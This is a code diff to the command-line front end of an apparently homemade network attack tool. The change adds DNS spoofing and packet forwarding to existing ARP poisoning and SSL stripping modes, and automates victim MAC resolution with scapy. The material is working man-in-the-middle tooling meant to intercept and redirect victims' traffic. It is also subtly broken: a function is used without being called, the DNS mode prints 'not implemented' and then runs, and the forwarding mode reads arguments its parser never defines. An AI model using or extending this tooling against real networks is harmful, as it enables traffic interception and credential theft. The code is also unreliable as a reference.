@@ -2,7 +2,9 @@ import argparse
 import sys
 import os
 from arp_poisoning import ARP_Poisoning
-from ssl_stripping import SSLStripper  # <== ADDED
+from dns_spoofer import DNS_Spoofer
+from ssl_stripping import SSLStripper
+from forwarder import PacketForwarder
 import scapy.all as scapy
 
 def get_network_info():
@@ -36,31 +38,70 @@ def validate_ip(ip):
     octets = ip.split('.')
     return all(0 <= int(octet) <= 255 for octet in octets)
 
+def resolve_mac(ip, iface):
+    """Sends an ARP request to resolve the MAC address for a given IP."""
+
+    arp_req = scapy.Ether(dst="ff:ff:ff:ff:ff:ff") / scapy.ARP(pdst=ip)
+    ans, _ = scapy.srp(arp_req, timeout=2, iface=iface, verbose=False)
+
+    if ans:
+        return ans[0][1].hwsrc
+    else:
+        print(f"[!] Could not resolve MAC for {ip}")
+        return None
+
 def run_arp_poisoning(args):
     """Execute ARP poisoning attack"""
     print(f"[+] Starting ARP Poisoning Attack")
-    print(f"    Target: {args.victim_ip} ({args.victim_mac})")
-    print(f"    Spoofing: {args.ip_to_spoof}")
+    print(f"    Victim: {args.victim_ip} ({args.victim_mac})")
+    print(f"    Spoofing: {args.server_ip}")
     print(f"    Interface: {args.interface}")
     print(f"    Interval: {args.interval}s")
     print("[!] Press Ctrl+C to stop")
+
+    _, local_ip, local_mac = get_network_info
+    victim_mac = resolve_mac(args.victim_ip, args.interface)
+    server_mac = resolve_mac(args.server_ip, args.interface)
     
-    arp_attack = ARP_Poisoning(
+    arp_mitm = ARP_Poisoning(
         iface=args.interface,
         packet_interval=args.interval,
-        victim_mac=args.victim_mac,
+        victim_mac=victim_mac,
         victim_ip=args.victim_ip,
-        ip_to_spoof=args.ip_to_spoof,
-        attacker_mac=args.attacker_mac,
-        attacker_ip=args.attacker_ip
+        server_mac=server_mac,
+        server_ip=args.server_ip,
+        attacker_mac=local_mac,
+        attacker_ip=local_ip
     )
     
-    arp_attack.run()
+    arp_mitm.run()
 
 def run_dns_spoofing(args):
-    """Execute DNS spoofing attack (placeholder)"""
+    """Execute DNS spoofing attack"""
     print("[!] DNS Spoofing not implemented yet")
-    sys.exit(1)
+    dns_attack = DNS_Spoofer(
+        interface=args.interface,
+        target_ip=args.target,
+        domain=args.domain,
+        redirect_ip=args.redirect
+    )
+    dns_attack.run()
+
+def run_forwarding(args):
+    """Execute packet forwarding attack"""
+    print(f"[+] Starting packet forwarding")
+    print(f"    Victim: {args.victim_ip}")
+    print(f"    Gateway: {args.gateway_ip}s")
+    print(f"    Attacker: {args.gateway_ip}s")
+    print(f"    Interface: {args.interface}")
+    print("[!] Press Ctrl+C to stop")
+    forwarder = PacketForwarder(
+        iface=args.interface,
+        victim_ip=args.victim_ip,
+        gateway_ip=args.gateway_ip,
+        attacker_ip=args.attacker_ip
+    )
+    forwarder.run()
 
 def run_ssl_stripping(args):
     """Execute SSL stripping attack"""
@@ -82,7 +123,7 @@ def main():
     default_iface, local_ip, local_mac = get_network_info()
     
     parser = argparse.ArgumentParser(
-        description='Network Attack Tool - ARP Poisoning, DNS Spoofing, SSL Stripping',
+        description='Network Attack Tool - ARP Poisoning, DNS Spoofing, Packet Forwarding, SSL Stripping',
         formatter_class=argparse.RawDescriptionHelpFormatter,
     )
     
@@ -92,19 +133,24 @@ def main():
     # ARP Poisoning parser
     arp_parser = subparsers.add_parser('arp', help='ARP Poisoning attack')
     arp_parser.add_argument('--victim-ip', required=True, help='Target victim IP address')
-    arp_parser.add_argument('--victim-mac', required=True, help='Target victim MAC address')
-    arp_parser.add_argument('--ip-to-spoof', required=True, help='IP address to spoof')
+    arp_parser.add_argument('--server-ip', required=True, help='IP address to spoof')
     arp_parser.add_argument('--interface', default=default_iface, help=f'Network interface (default: {default_iface})')
     arp_parser.add_argument('--interval', type=float, default=2.0, help='Spoofed packet repetition interval in seconds (default: 2.0)')
-    arp_parser.add_argument('--attacker-ip', default=local_ip, help=f'Attacker IP address (default: {local_ip})')
-    arp_parser.add_argument('--attacker-mac', default=local_mac, help=f'Attacker MAC address (default: {local_mac})')
     
-    # DNS Spoofing parser (placeholder for now)
-    dns_parser = subparsers.add_parser('dns', help='DNS Spoofing attack (not implemented)')
-    dns_parser.add_argument('--target', required=True, help='Target IP address')
-    dns_parser.add_argument('--domain', required=True, help='Domain to spoof')
+    # DNS Spoofing parser (now with interface)
+    dns_parser = subparsers.add_parser('dns', help='DNS Spoofing attack')
+    dns_parser.add_argument('--target', required=False, default="", help='Target IP address (leave blank to spoof all)')
+    dns_parser.add_argument('--domain', required=False, default="", help='Domain to spoof (leave blank to spoof all)')
     dns_parser.add_argument('--redirect', required=True, help='IP to redirect to')
-    
+    dns_parser.add_argument('--interface', default=default_iface, help='Network interface (default: {})'.format(default_iface))
+
+    # Forwarding parser
+    forward_parser = subparsers.add_parser('forward', help='Packet Forwarding attack')
+    forward_parser.add_argument('--victim-ip', required=True, help='Victim IP address')
+    forward_parser.add_argument('--server-ip', required=True, help='Server IP address to forward packets to')
+    forward_parser.add_argument('--interface', default=default_iface, help='Network interface')
+    forward_parser.add_argument('--attacker-ip', default=local_ip, help='Attacker IP address')
+
     # SSL Stripping parser (fully implemented)
     ssl_parser = subparsers.add_parser('ssl', help='SSL Stripping attack')
     ssl_parser.add_argument('--target', required=True, help='Target IP address')
@@ -121,11 +167,8 @@ def main():
         if not validate_ip(args.victim_ip):
             print(f"[!] Error: Invalid victim IP address: {args.victim_ip}")
             sys.exit(1)
-        if not validate_mac(args.victim_mac):
-            print(f"[!] Error: Invalid victim MAC address: {args.victim_mac}")
-            sys.exit(1)
-        if not validate_ip(args.ip_to_spoof):
-            print(f"[!] Error: Invalid spoof IP address: {args.ip_to_spoof}")
+        if not validate_ip(args.server_ip):
+            print(f"[!] Error: Invalid spoof IP address: {args.server_ip}")
             sys.exit(1)
         if args.interval <= 0:
             print(f"[!] Error: Interval must be positive: {args.interval}")
